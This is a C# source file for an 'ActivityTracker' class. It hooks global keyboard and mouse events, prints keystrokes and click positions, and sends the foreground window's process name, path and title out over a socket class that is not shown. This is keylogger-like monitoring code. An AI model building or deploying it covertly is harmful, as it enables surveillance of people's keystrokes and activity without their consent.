using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;

namespace Tracker
{
    class ActivityTracker
    {
        [DllImport("user32.dll")]
        static extern int GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private static ActivityTracker trackerInstance = null;

        public static void Start()
        {
            if (trackerInstance == null)
            {
                trackerInstance = new ActivityTracker();
            }

        }

        private ActivityHook choosesc;
        private ActivityTracker()
        {
            choosesc = new ActivityHook();
            choosesc.OnMouseActivity += new MouseEventHandler(choose_OnMouseActivity);
            choosesc.KeyDown += new KeyEventHandler(MyKeyDown);
            choosesc.KeyPress += new KeyPressEventHandler(MyKeyPress);
            choosesc.KeyUp += new KeyEventHandler(MyKeyUp);
        }

        private void setTextje()
        {
            Int32 hwnd = 0;
            hwnd = GetForegroundWindow();
            string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
            string appExePath = Process.GetProcessById(GetWindowProcessID(hwnd)).MainModule.FileName;
            string app = Process.GetProcessById(GetWindowProcessID(hwnd)).MainWindowTitle;
            string appExeName = appExePath.Substring(appExePath.LastIndexOf(@"\") + 1);

            ActivitySocket.GetInstance().send(appProcessName + " | " + appExePath + " | " + appExeName + " | " + app);
            Console.Write(appProcessName + " | " + appExePath + " | " + appExeName + " | " + app);
        }

        private Int32 GetWindowProcessID(Int32 hwnd)
        {
            Int32 pid = 1;
            GetWindowThreadProcessId(hwnd, out pid);
            return pid;
        }

        public void MyKeyDown(object sender, KeyEventArgs e)
        {
            Console.Write(e.KeyData.ToString());
        }

        public void MyKeyPress(object sender, KeyPressEventArgs e)
        {
            Console.Write(e.KeyChar.ToString());
        }

        public void MyKeyUp(object sender, KeyEventArgs e)
        {
            Console.Write(e.KeyData.ToString());
        }



        private void choose_OnMouseActivity(object sender, MouseEventArgs e)
        {
            if (e.Clicks > 0)
            {
                if ((MouseButtons)(e.Button) == MouseButtons.Left)
                {
                    Console.Write(e.Location.ToString());
                }
                if ((MouseButtons)(e.Button) == MouseButtons.Right)
                {
                    Console.Write(e.Location.ToString());
                }
            }
            //throw new Exception("The method or operation is not implemented.");
            try
            {
                setTextje();
            }
            catch (Exception err)
            {
                Console.Write(err.Message);
            }
        }
    }
}
